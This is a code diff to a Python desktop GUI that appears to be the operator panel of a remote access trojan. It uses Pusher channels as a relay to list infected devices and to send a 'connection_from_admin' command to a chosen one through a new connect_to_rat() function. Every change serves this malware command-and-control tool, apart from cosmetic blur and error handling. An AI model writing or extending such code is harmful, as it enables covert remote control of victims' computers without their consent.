@@ -6,6 +6,7 @@ import pusher
 import pusher.errors
 import pysher
 import modules.exception as exception
+from BlurWindow.blurWindow import GlobalBlur
 sys.path.append('gui')
 # Importing the main window
 try:
@@ -24,6 +25,8 @@ settings = Settings.get_settings()
 # Global variables for annotations
 client = pusher.Pusher
 receiver = pysher.Pusher
+channel: receiver.subscribe = None
+client_id = str()
 
 # Initializing the main window
 app = QtWidgets.QApplication(sys.argv)
@@ -31,6 +34,7 @@ MainWindow = QtWidgets.QMainWindow()
 ui = Ui_MainWindow()
 ui.setupUi(MainWindow)
 ui.pagesWidget.setCurrentIndex(0)
+GlobalBlur(MainWindow.winId(), Acrylic=True)
 
 # Trying to get settings or set default
 try:
@@ -50,16 +54,19 @@ def initialize_pusher() -> None:
     """
     global client
     global receiver
-    client = pusher.Pusher(
-        app_id=settings["app_id"],
-        key=settings["key"],
-        secret=settings["secret"],
-        cluster=settings["cluster"],
-        ssl=False
-    )
-    receiver = pysher.Pusher(key=settings["key"], cluster=settings["cluster"])
-    receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
-    receiver.connect()
+    try:
+        client = pusher.Pusher(
+            app_id=settings["app_id"],
+            key=settings["key"],
+            secret=settings["secret"],
+            cluster=settings["cluster"],
+            ssl=False
+        )
+        receiver = pysher.Pusher(key=settings["key"], cluster=settings["cluster"])
+        receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
+        receiver.connect()
+    except Exception as e:
+        print(e)
 
 
 def open_menu(*args) -> None:
@@ -100,6 +107,20 @@ def handle_menu_click(text: str) -> None:
     index[text][0](index[text][1])
 
 
+def connect_to_rat() -> None:
+    """
+    Connects to rat based on selected id
+    :return:
+    """
+    global client_id
+    try:
+        client_id = ui.availableDevices.currentItem().text()
+        client.trigger('admin-' + str(client_id), 'connection_from_admin', None)
+        print("Sent connection message to client")
+    except Exception as e:
+        print(e)
+
+
 def handle_connection_to_server(connection) -> None:
     """
     On pusher connection
@@ -109,7 +130,7 @@ def handle_connection_to_server(connection) -> None:
     print("Server returned: " + str(connection))
     try:
         for client_id_av in list(client.channels_info(prefix_filter='admin-')['channels']):
-            print("Channel: " + client_id_av.split('-')[1])
+            ui.availableDevices.addItem(client_id_av.split('-')[1])
     except pusher.errors.PusherBadRequest:
         popup("Error", "Could not connect to pusher server\n"
                        "Do you have valid pusher config in settings tab?")
@@ -121,8 +142,11 @@ def reconnect_to_pusher() -> None:
     :return:
     """
     global receiver
-    receiver.disconnect()
-    print("Disconnected from pusher")
+    try:
+        receiver.disconnect()
+        print("Disconnected from pusher")
+    except:
+        print("Pusher not connected")
     initialize_pusher()
 
 
@@ -133,6 +157,7 @@ initialize_pusher()
 ui.leftMenu.itemClicked.connect(lambda: handle_menu_click(ui.leftMenu.currentItem().text()))
 ui.saveSettingsButton.clicked.connect(lambda: (globals().update(settings=update_settings(ui))))
 ui.reconRefreshButton.clicked.connect(lambda: reconnect_to_pusher())
+ui.connectButton.clicked.connect(lambda: connect_to_rat())
 
 # Handling closing of the window to exit whole program
 sys.exit(app.exec_())
